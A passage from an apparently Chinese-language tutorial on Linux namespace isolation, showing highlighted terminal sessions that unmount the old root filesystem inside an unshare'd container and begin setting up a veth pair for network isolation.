<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">local</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">sbin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">local</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">bin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">sbin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">usr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">bin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">sbin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">bin</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# mount -t proc none /proc</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ps -ef</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">UID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         PID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   PPID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> STIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TTY</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          TIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CMD</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">          1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 01:55</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ?</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">         28</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 02:14</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ?</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ef</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# umount -a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">umount:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> busy.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">In</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> some</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cases</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> useful</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> info</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> about</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> processes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> that</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> found</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> by</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lsof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fuser</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">umount:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot/dev:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> busy.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">In</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> some</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cases</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> useful</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> info</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> about</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> processes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> that</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> found</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> by</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lsof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fuser</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">umount:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> target</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> busy.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        (</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">In</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> some</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cases</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> useful</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> info</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> about</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> processes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> that</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">         the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> found</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> by</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lsof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">8</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fuser</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# mount</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/centos_monther-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xfs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,relatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,noquota)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devtmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot/dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devtmpfs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,nosuid,seclabel,size=1982216k,nr_inodes=495554,mode=755)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devpts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot/dev/pts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devpts</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=000)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">proc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot/proc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,nosuid,nodev,noexec,relatime)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sysfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot/sys</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sysfs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,nosuid,nodev,noexec,relatime,seclabel)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">selinuxfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot/sys/fs/selinux</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> selinuxfs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,relatime)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/centos_monther-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xfs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,relatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,noquota)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">none</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,relatime)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# df -h</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                       Size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  Used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Avail</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Use%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Mounted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/centos_monther-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   49G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8.4G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   41G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  18%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">devtmpfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                         1.9G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  1.9G</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   0%</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /oldroot/dev</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]#</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# mount -t proc none /proc</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ls /proc/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          cgroups</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   devices</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        execdomains</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  iomem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     keys</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         kpageflags</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  misc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     pagetypeinfo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  slabinfo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  sysrq-trigger</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uptime</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">34</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         cmdline</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   diskstats</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      fb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           ioports</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   key-users</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    loadavg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     modules</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  partitions</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    softirqs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  sysvipc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        version</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">acpi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       consoles</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  dma</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">            filesystems</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  irq</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       kmsg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         locks</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       mounts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   schedstat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     stat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      thread-self</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    vmallocinfo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">buddyinfo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  cpuinfo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   driver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         fs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           kallsyms</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  kpagecgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  mdstat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      mtrr</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     scsi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          swaps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     timer_list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     vmstat</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bus</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        crypto</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    dynamic_debug</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  interrupts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   kcore</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     kpagecount</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   meminfo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">     net</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">      self</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          sys</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       tty</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">            zoneinfo</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# umount -l oldroot/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# mount</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/dev/mapper/centos_monther-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xfs</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,relatime,seclabel,attr2,inode64,logbufs=8,logbsize=32k,noquota)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">none</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> type</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> proc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (rw,relatime)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>NET隔离</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 宿主机</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# pidof unshare</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2390</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">CPID</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">2390</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# ip link add name h</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$CPID</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> type veth peer name c</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$CPID</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# ip l</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens160:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mq</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:0c:29:7c:f4:a1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 02:42:12:70:3f:6e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
